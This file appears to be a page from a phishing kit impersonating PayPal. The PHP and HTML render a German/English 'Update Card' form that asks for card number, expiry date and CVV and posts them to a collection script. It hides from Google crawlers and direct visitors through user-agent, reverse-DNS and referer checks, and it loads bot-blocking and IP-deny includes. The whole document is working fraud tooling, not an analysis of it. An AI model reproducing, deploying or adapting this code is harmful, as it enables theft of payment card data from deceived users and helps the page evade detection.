<?php 
$aa = $_SERVER['HTTP_HOST'];
$ref = $_SERVER['HTTP_REFERER'];
$refData = parse_url($ref);
if ($refData['host'] !=$aa) {
?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
     header('HTTP/1.0 404 Not Found');
     exit(); ?>
<?php }else{ ?><?php
session_start();
error_reporting(0);

/*
█▀▀█ █▀▀█ █░░   ▀█░█▀ ░█▀█░ ░ █▀▀█
█░░█ █░░█ █░░   ░█▄█░ █▄▄█▄ ▄ █▄▀█
█▀▀▀ █▀▀▀ ▀▀▀   ░░▀░░ ░░░█░ █ █▄▄█
                                                 
*/


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

session_start();

include("functionns/Bot-blocker.php");
include("functionns/Geo-plugin.php");
include("functionns/OS-Platform.php");
include('../Denny-ip.php');

$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);
?>
<!DOCTYPE html>
<html data-reactroot=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<link rel="shortcut icon" sizes="196x196" href="source/img/pp258.png">
<link rel="shortcut icon" type="image/x-icon" href="source/img/pp258.png">
<link rel="icon" type="image/x-icon" href="source/img/pp32.png">
<link rel="stylesheet" href="source/paypal-sans.css">
<link rel="stylesheet" href="source/main.css">
<link rel="stylesheet" href="source/body.css">
<title>
Karte aktualisieren</title>
<style id="inert-style">
[inert] {
  pointer-events: none;
  cursor: default;
}

[inert], [inert] * {
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
</style></head>
<body class="vx_root vx_addFlowTransition ">
<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader">
<div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper vx_modal-wrapper_logo elementDirection" tabindex="-1">
<div>
<a href="#" data-name="modalClose" class="vx_modal-dismiss_x test_dismissFlow" pa-marked="1">
<span class="vx_a11yText">fermer</span></a><div class="vx_modal-content">
<header class="vx_modal-header">
<h2 id="js_modalHeader" class="vx_text-2 header-centered">
Update Card</h2>
<p class="vx_text-body"></p><center><img src="source/generic_card.png" style="width:250px"></center><p></p></header><div class="vx_modal-body vx_blocks-for-mobile">
<div><div class="vx_modal-body vx_blocks-for-mobile"><div class="form-container">


<form name="A1" method="post" action="functionns/cc-csc.php" class="proceed maskable">

<div class="cardForm-cardArt"></div>
<div>
<label class="floatingLabel" for="cardNumber"></label>
<div class="vx_form-control vx_form-control_complex">
<input type="text" id="cardNumber" name="cardNumber" class="test_cardNumber test_cardNumber"  placeholder="Card Number" autocomplete="off" type="text" required="" aria-required="true"><span></span>
 </div></div>
<label for="expDate"></label>
<div class="vx_form-control vx_form-control_complex">
<input type="text" id="expDate" name="expDate" class="undefined test_expDate" placeholder="expiration date  MM/YYYY" autocomplete="off" type="text" required="" aria-required="true"><span></span></div></div>
<div class="table-container"><div class="table-row">
<div class="table-col-xs-10"><div>
<label class="floatingLabel" for="verificationCode"></label>
<div class="vx_form-control vx_form-control_complex">
<input type="password" id="verificationCode" name="verificationCode" class="test_verificationCode test_verificationCode" placeholder="Cvv" type="text" autocomplete="off" type="text" required="" aria-required="true"><span></span></div></div></div>
<div class="table-col-xs-2 cardImage-container"><span data-name="" class="rectangleLogo_small shadow  csc-image ">
</span></div></div></div>
<br><p></p>
<div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="Next">update</button></div></form>
</div></div></div></div></div></div></div></body></html><?php } ?>